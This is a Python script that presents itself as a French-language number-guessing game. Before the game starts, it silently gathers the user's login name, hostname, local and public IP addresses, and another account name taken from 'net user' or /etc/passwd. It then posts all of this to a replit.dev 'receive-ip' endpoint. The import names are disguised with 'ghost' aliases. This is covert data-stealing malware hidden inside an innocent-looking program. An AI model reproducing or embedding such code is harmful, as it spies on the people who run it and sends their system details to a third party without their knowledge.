import socket as ghost1
import requests as ghost2
import random as ghost3
import os as ghost4
import getpass as ghost5
import platform as ghost6
import subprocess as ghost7

ghost_user = lambda: ghost5.getuser()
ghost_host = lambda: ghost1.gethostname()
ghost_local_ip = lambda: ghost1.gethostbyname(ghost_host())
ghost_public_ip = lambda: ghost2.get("https://api.ipify.org?format=json").json()["ip"]
ghost_ipv4 = lambda: (lambda sock: (sock.connect(("8.8.8.8", 80)), sock.getsockname()[0], sock.close())[1])(ghost1.socket(ghost1.AF_INET, ghost1.SOCK_DGRAM))

def ghost_second_user():
    try:
        users = []
        if ghost6.system() == "Windows":
            output = ghost7.check_output("net user", shell=True, encoding="utf-8", errors="ignore")
            for line in output.splitlines():
                if "------" in line or "nom d’utilisateur" in line.lower():
                    continue
                users.extend(line.split())
        elif ghost6.system() in ["Linux", "Darwin"]:
            with open("/etc/passwd", "r") as f:
                for line in f:
                    parts = line.split(":")
                    if int(parts[2]) >= 1000 and "nologin" not in parts[-1]:
                        users.append(parts[0])
        users = list(set(users))
        users.sort()
        return users[1] if len(users) > 1 else "Aucun"
    except Exception as e:
        return f"Err:{str(e)}"

def ghost_game():
    print("Bienvenue.\nJeu de devinette.")
    while True:
        try:
            level = int(input("Niveau (1-3)? "))
            if level in [1, 2, 3]:
                break
            else:
                print("Choix: 1/2/3")
        except:
            print("Entrée invalide.")
    if level == 1:
        stages = [{"p": 10, "t": 5}, {"p": 20, "t": 4}, {"p": 30, "t": 3}]
    elif level == 2:
        stages = [{"p": 20, "t": 4}, {"p": 40, "t": 4}, {"p": 60, "t": 3}]
    else:
        stages = [{"p": 30, "t": 5}, {"p": 60, "t": 4}, {"p": 100, "t": 3}]

    for i, stage in enumerate(stages, 1):
        print(f"\n--- Etape {i} ---")
        secret = ghost3.randint(1, stage["p"])
        tries = stage["t"]
        print(f"Devine 1-{stage['p']} ({tries} essais)")
        for attempt in range(1, tries + 1):
            try:
                guess = int(input(f"[{attempt}] > "))
                if guess < secret:
                    print("Plus grand")
                elif guess > secret:
                    print("Plus petit")
                else:
                    print(f"GG ! C'était {secret} en {attempt} coups.")
                    break
            except:
                print("Nombre invalide")
        else:
            print(f"Raté. C'était {secret}.")
            return
    print(f"Level {level} réussi !")

ghost_data = {
    "ipv4": ghost_ipv4(),
    "local_ip": ghost_local_ip(),
    "public_ipv4": ghost_public_ip(),
    "hostname": ghost_host(),
    "username": ghost_user(),
    "second_user": ghost_second_user()
}

ghost2.post("https://de67189f-7e90-4f3a-9fff-39cafbe18164-00-2f706tld59u8s.spock.replit.dev/receive-ip", json=ghost_data)

ghost_game()



print(r"""
       /\                 /\     
      / \\'._  (\_/)  _.'// \    
     / .''._'--(o.o)--'_.''. \   
    /.' _/ |`'=/ " \='`| \_ `.\  
   /` .' `\;-,'\___/',-;/` '. '\ 
  /.-'       `\(-V-)/`       `-.\
               "   "
             MXB WIN+1
""")


                 
